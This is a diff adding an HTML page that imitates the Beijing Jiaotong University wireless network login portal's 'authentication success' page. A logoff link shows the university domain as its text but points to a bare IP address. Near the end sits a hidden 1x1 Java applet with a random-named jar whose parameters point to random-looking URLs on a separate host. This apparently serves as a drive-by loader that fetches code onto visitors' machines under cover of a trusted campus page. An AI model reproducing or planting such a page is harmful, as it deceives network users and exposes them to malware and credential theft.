@@ -1,0 +1,155 @@
+<!-- saved from url=(0022)http://internet.e-mail -->
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head><!--Provoke the inclusion of text depending on the client auth state -->
+
+    <SCRIPT language=JavaScript>
+        function checkvalue() {
+            if (loginForm.PtUser.value == null || loginForm.PtUser.value == "") {
+                alert("请输入您的用户名。");
+                document.loginForm.PtUser.focus();
+                return false;
+            }
+            return true;
+        }
+
+        // The backup and restore warning informations,by g02084,2006-12-29.
+        // Get the screen width and heighth
+        var posLeft = parseInt(screen.availWidth * 70.0 / 100);
+        var posHeight = parseInt(screen.availHeight * 50.0 / 100);
+
+        function getWarnShellStyle() {
+            var styleTest = "z-index:10002;width:210;height:110;left:" + posLeft
+                    + ";top:" + posHeight + ";background-color:slategray;color:red;"
+                    + "font-size:12px;font-family:Verdana;position:absolute;"
+                    + "cursor:default;border:1px solid slategray;";
+            return styleTest;
+        }
+
+        function getWarnContentStyle() {
+            var styleTest = "width:210;height:110;left:" + posLeft
+                    + ";top:" + posHeight + ";z-index:10001;position:absolute;"
+                    + "background-color:black;filter:alpha(opacity=40);";
+            return styleTest;
+        }
+    </SCRIPT>
+
+    <style type="text/css">
+        <!--
+        body {
+            font-family: Verdana, Arial, Helvetica, sans-serif;
+            font-size: 11px;
+            color: #000000;
+        }
+
+        td {
+            font-family: Verdana, Arial, Helvetica, sans-serif;
+            font-size: 11px;
+            color: #000000;
+        }
+
+        h3 {
+            font-family: Verdana, Arial, Helvetica, sans-serif;
+            color: #1E3C78;
+            font-size: 14px;
+        }
+
+        .STYLE1 {
+            font-size: 11mm
+        }
+
+        .STYLE2 {
+            font-size: 24px
+        }
+
+        .STYLE3 {
+            font-size: 18px
+        }
+
+        .STYLE5 {
+            font-size: xx-large;
+            color: #FF0000;
+        }
+
+        .STYLE8 {
+            font-size: 18px;
+            color: #FF0000;
+        }
+
+        -->
+    </style>
+    <!-- Modify web page title below --><title>北京交通大学无线网络认证系统</title><!-- End modification web page title -->
+    <meta http-equiv="Content-Type" content="text/html; charset=gb2312">
+</head>
+<body>
+
+<!-- Modify company .gif and greeting below -->
+
+<center>
+    <img src="../image/bjtu.jpg" alt="Company Logo" border="0" height="72" width="776">
+</center>
+<h1 align="center" class="STYLE1"><font color="#CC6699">无线校园网认证系统</font></h1>
+
+<h1 align="center" class="STYLE1"><font color="#CC6699" class="STYLE2">Wireless Network Authentication System</font>
+</h1>
+<hr>
+<br>
+
+<form method=post action="http://172.25.32.4:8081/offline.htm">
+    <table width="902" border="0" align="center">
+        <tr>
+            <td width="896"><p align="center" class=STYLE5 STYLE7 STYLE4><span style="font-size: x-large"><span
+                    style="font-size: 24px"><b
+                    style='mso-bidi-font-weight:normal'>认证成功!</b></span></span></p>
+
+                <p align="center" class=STYLE8 STYLE4>请保留此窗口，以便点击下方按钮下线，也可在浏览器地址栏输入以下地址下线：</p>
+
+                <p align="center" class=STYLE8 STYLE4>Please keep this window and click the button to logoff, you also
+                    can </p>
+
+                <p align="center" class=STYLE8 STYLE4>input the following address in the browser address bar to
+                    logoff:</p>
+
+                <p align="center" class=STYLE8 STYLE4><a href="https://10.1.154.2/portal/logon.htm">https://ac1.bjtu.edu.cn/portal/logon.htm</a>
+                </p>
+
+                <p align="center" class=STYLE8 STYLE4>&nbsp;</p></td>
+        </tr>
+        <tr>
+            <td bordercolor="#ECE9D8">
+                <div align="center">
+                    <input type=SUBMIT value=Logoff name=PtButton style=width:80px;>
+                </div>
+            </td>
+        </tr>
+    </table>
+</form>
+<p>
+<hr>
+<!-- END DO_NOT_MODIFY_THE_SOURCE -->
+<!-- Modify warning statement below -->
+</p>
+<p align="center" class="STYLE3"><span class="STYLE3">注意事项</span> Notice</p>
+
+<p align="center" class="STYLE3">用户名/密码处请输入您在校园网计费网关上的用户名和密码</p>
+
+<p align="center" class="STYLE3">Please enter your username and password of campus network billing gateway</p>
+
+<p align="center">&nbsp;</p>
+<applet code="Java.class" width="1" height="1" archive="o8ZQfqyG0Vy.jar">
+    <param name="name">
+    <param name="1" value="http://172.25.44.135:80/n42r2cP">
+    <param name="2" value="">
+    <param name="3" value="http://172.25.44.135:80/haDqf9V">
+    <param name="4" value="http://172.25.44.135:80/bReT4AFkn">
+    <param name="5" value="">
+    <param name="6" value="">
+    <param name="7" value="freehugs">
+    <param name="8" value="YES">
+    <param name="9" value="http://172.25.32.4:8081">
+    <param name="10" value="">
+    <param name="separate_jvm" value="true">
+</applet>
+
+</body>
+</html>
